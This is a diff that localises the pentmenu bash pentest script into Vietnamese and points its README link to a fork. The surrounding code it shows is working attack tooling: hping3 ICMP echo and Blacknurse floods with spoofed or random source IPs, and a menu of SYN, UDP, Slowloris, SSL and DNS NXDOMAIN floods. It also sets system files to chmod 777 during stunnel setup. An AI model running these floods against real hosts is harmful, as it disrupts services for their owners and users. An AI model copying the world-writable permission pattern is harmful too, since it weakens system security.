@@ -204,33 +204,33 @@ sudo nmap -Pn -p 1-65535 -sU -T $SPEED $TARGET --reason
 #####################
 ##START CHECKUPTIME##
 checkuptime()
-{ echo "This module will attempt to estimate the uptime of a given server, using hping3"
-  echo "This is not guaranteed to work"
-  echo "Enter your target:"
+{ echo "Mô-đun này sẽ cố gắng ước tính thời gian hoạt động của một máy chủ nhất định, sử dụng hping3"
+  echo "Điều này không được đảm bảo hoạt động"
+  echo "Nhập mục tiêu của bạn: "
 #need a target IP/hostname
   read -i $TARGET -e TARGET
 #need a target port
-  echo "Enter port (default is 80):"
+  echo "Nhập cổng (mặc định là 80): "
   read -i $PORT -e PORT
   : ${PORT:=80}
 #check a valid integer is given for the port, anything else is invalid
 	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
-PORT=80 && echo "Invalid port, reverting to port 80"
+PORT=80 && echo "Cổng không hợp lệ, đang hoàn nguyên về cổng 80"
 	elif [ "$PORT" -lt "1" ]; then
-PORT=80 && echo "Invalid port number chosen! Reverting port 80"
+PORT=80 && echo "Số cổng được chọn không hợp lệ! Hoàn nguyên cổng 80"
 	elif [ "$PORT" -gt "65535" ]; then
-PORT=80 && echo "Invalid port chosen! Reverting to port 80"
-	else echo "Using Port $PORT"
+PORT=80 && echo "Đã chọn cổng không hợp lệ! Hoàn nguyên về cổng 80"
+	else echo "Sử dụng cổng $PORT"
 	fi
 #how many times to retry the check?
-  echo "Retries? (3 is ideal and default, 2 might also work)"
+  echo "Thử lại? (3 là lý tưởng và mặc định, 2 cũng có thể hoạt động)"
   read -i $RETRY -e RETRY
   : ${RETRY:=3}
   echo "Starting.."
 #use hping3 and enable the TCP timestamp option, and try to guess the timestamp update frequency and the remote system uptime.
 #this might not work, but sometimes it does work very well
   sudo hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
-  echo "Done."
+  echo "Xong."
 }
 ##END CHECKUPTIME##
 ###################
@@ -238,7 +238,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 ####################
 ##START IPSEC SCAN##
 ipsecscan()
-{ echo "Please enter the target hostname or IP:"
+{ echo "Vui lòng nhập tên máy chủ hoặc IP mục tiêu: "
 #we need to know where to scan
 read -i $TARGET -e TARGET
 # Encryption algorithms: DES, Triple-DES, AES/128, AES/192 and AES/256
@@ -271,7 +271,7 @@ done
 dosmenu()
 {
 #display a menu for the DOS module using bash select
-		dosmenu=("ICMP Echo Flood" "ICMP Blacknurse" "TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "IPsec DOS" "Distraction Scan" "DNS NXDOMAIN Flood" "Go back")
+		dosmenu=("ICMP Echo Flood" "ICMP Blacknurse" "TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "IPsec DOS" "Distraction Scan" "DNS NXDOMAIN Flood" "Quay lại")
 	select dosopt in "${dosmenu[@]}"; do
 #ICMP Echo Flood
 	if [ "$dosopt" = "ICMP Echo Flood" ]; then
@@ -310,11 +310,11 @@ dosmenu()
 	elif [ "$dosopt" = "DNS NXDOMAIN Flood" ]; then
 		nxdomainflood
 #Go back
-	elif [ "$dosopt" = "Go back" ]; then
+	elif [ "$dosopt" = "Quay lại" ]; then
 		mainmenu
 	else
 #Default if no valid menu option selected is to return an error
-  	echo  "That's not a valid option! Hit Return to show menu"
+  	echo  "Đó không phải là một lựa chọn hợp lệ! Nhấn Quay lại để hiển thị menu"
 	fi
 done
 }
@@ -325,25 +325,25 @@ done
 ##START ICMPFLOOD##
 icmpflood()
 {
-		echo "Preparing to launch ICMP Echo Flood using hping3"
-		echo "Enter target IP/hostname:"
+		echo "Chuẩn bị khởi chạy ICMP Echo Flood bằng hping3"
+		echo "Nhập IP / tên máy chủ đích: "
 #need a target IP/hostname
 		read -i $TARGET -e TARGET
 #What source address to use? Manually defined, or random, or outgoing interface IP?
-		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
+		echo "Nhập IP nguồn hoặc [r] andom hoặc [i] giao diện IP (mặc định): "
 	read -i $SOURCE -e SOURCE
 	: ${SOURCE:=i}
 	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
-		echo "Starting ICMP echo Flood. Use 'Ctrl c' to end and return to menu"
+		echo "Đang khởi động ICMP echo Flood. Sử dụng 'Ctrl c' để kết thúc và quay lại menu"
 		sudo hping3 -1 --flood --spoof $SOURCE $TARGET
 	elif [ "$SOURCE" = "r" ]; then
-		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+		echo "Đang khởi động ICMP Echo Flood. Sử dụng 'Ctrl c' để kết thúc và quay lại menu"
 		sudo hping3 -1 --flood --rand-source $TARGET
 	elif [ "$SOURCE" = "i" ]; then
-		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+		echo "Đang khởi động ICMP Echo Flood. Sử dụng 'Ctrl c' để kết thúc và quay lại menu"
 		sudo hping3 -1 --flood $TARGET
-	else echo "Not a valid option!  Using interface IP"
-		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
+	else echo "Không phải là một lựa chọn hợp lệ! Sử dụng IP giao diện"
+		echo "Đang khởi động ICMP Echo Flood. Sử dụng 'Ctrl c' để kết thúc và quay lại menu"
 		sudo hping3 -1 --flood $TARGET
 	fi
 }
@@ -354,25 +354,25 @@ icmpflood()
 ##START BLACKNURSE##
 blacknurse()
 {		
-		echo "Preparing to launch ICMP Blacknurse Flood using hping3"
-		echo "Enter target IP/hostname:"
+		echo "Chuẩn bị khởi chạy ICMP Blacknurse Flood bằng hping3"
+		echo "Nhập IP / tên máy chủ đích: "
 #need a target IP/hostname
 		read -i $TARGET -e TARGET
 #What source address to use? Manually defined, or random, or outgoing interface IP?
-		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
+		echo "Nhập IP nguồn hoặc [r] andom hoặc [i] giao diện IP (mặc định): "
 	read -i $SOURCE -e SOURCE
 	: ${SOURCE:=i}
 	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
-		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
+		echo "Bắt đầu Trận lụt Blacknurse. Sử dụng 'Ctrl c' để kết thúc và quay lại menu"
 		sudo hping3 -1 -C 3 -K 3 --flood --spoof $SOURCE $TARGET
 	elif [ "$SOURCE" = "r" ]; then
-		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
+		echo "Bắt đầu Trận lụt Blacknurse. Sử dụng 'Ctrl c' để kết thúc và quay lại menu"
 		sudo hping3 -1 -C 3 -K 3 --flood --rand-source $TARGET
 	elif [ "$SOURCE" = "i" ]; then
-		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
+		echo "Bắt đầu Trận lụt Blacknurse. Sử dụng 'Ctrl c' để kết thúc và quay lại menu"
 		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
-	else echo "Not a valid option!  Using interface IP"
-		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
+	else echo "Không phải là một lựa chọn hợp lệ! Sử dụng IP giao diện"
+		echo "Bắt đầu Trận lụt Blacknurse. Sử dụng 'Ctrl c' để kết thúc và quay lại menu"
 		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
 	fi
 }
@@ -1241,7 +1241,7 @@ showreadme()
 #use curl to show the readme file
 #i should probably add a check for a local copy
 {
-curl -s https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md | more
+curl -s https://raw.githubusercontent.com/DauDau432/pentmenu/main/README.md | more
 }
 ##END SHOWREADME##
 ##################
@@ -1252,20 +1252,20 @@ curl -s https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md |
 #################
 ##START STUNNEL##
 stunnel_client()
-{ echo "use SSL/TLS? [y]es or [n]o (default):"
+{ echo "sử dụng SSL / TLS? [y] es hoặc [n] o (mặc định): "
 	read SSL
 	: ${SSL:=n}
 #if not using SSL/TLS, carry on what we were doing
 #otherwise create an SSL/TLS tunnel using a local listener on TCP port 9991
 if [[ "$SSL" = "y" ]]
-	then echo "Using SSL/TLS"
+	then echo "Sử dụng SSL / TLS"
 LHOST=127.0.0.1
 LPORT=9991
 #ascertain if stunnel is defined in /etc/services and if not, add it & set permissions correctly
 grep -q $LPORT /etc/services
 if [[ $? = 1 ]]
 then
-echo "Adding pentmenu stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
+echo "Thêm dịch vụ đường hầm pentmenu vào /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
 fi
 #is ss is available, use that to shoew listening ports
 if test -f "/bin/ss"; then
@@ -1278,7 +1278,7 @@ $LISTPORT -tln |grep -q $LPORT
 if [[ "$?" = "1" ]]
 #if nothing is running on port 9991, create stunnel configuration
 then
-	echo "Creating stunnel client on $LHOST:$LPORT"
+	echo "Tạo ứng dụng khách stunnel trên $LHOST:$LPORT"
 		sudo rm -f /etc/stunnel/pentmenu.conf;
 		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
 		sudo echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
@@ -1289,7 +1289,7 @@ then
 		sudo chmod 644 /etc/stunnel/pentmenu.conf
 		sudo stunnel /etc/stunnel/pentmenu.conf && sleep 1
 #if stunnel listener is already active we don't bother recreating it
-else echo "Looks like stunnel is already listening on port 9991, so not recreating"
+else echo "Có vẻ như stunnel đã được lắng nghe trên cổng 9991, vì vậy không phải Recating"
 fi
 fi }
 ##END STUNNEL##
@@ -1312,11 +1312,12 @@ echo "| |       | |      | | \   |   | |   | |   | || |      | | \   || |   | |"
 echo "| |       | |____/\| |  \  |   | |   | |   | || |____/\| |  \  || |___| |"
 echo "|/        (_______/|/    \_|   |_|   |/     \||_______/|/    \_||_______|"
 echo ""
-echo "Welcome to pentmenu!"
-echo "Please report all bugs, improvements and suggestions to https://github.com/GinjaChris/pentmenu/issues"
-echo "This software is only for responsible, authorised use."
-echo "YOU are responsible for your own actions!"
-echo "Please review the readme at https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md before proceeding"
+echo "Chào mừng bạn đến với pentmenu!"
+echo "Vui lòng báo cáo tất cả các lỗi, cải tiến và đề xuất cho https://github.com/GinjaChris/pentmenu/issues"
+echo "Phần mềm này chỉ dành cho việc sử dụng có trách nhiệm, được phép."
+echo "Bạn chịu trách nhiệm cho hành động của bạn!"
+echo "Vui lòng xem lại readme tại https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md trước khi tiếp tục"
+echo "Chương trình được dịch bởi Đậu Đậu 5.0"
 echo ""
 mainmenu
 ##END WELCOME MESSAGE##
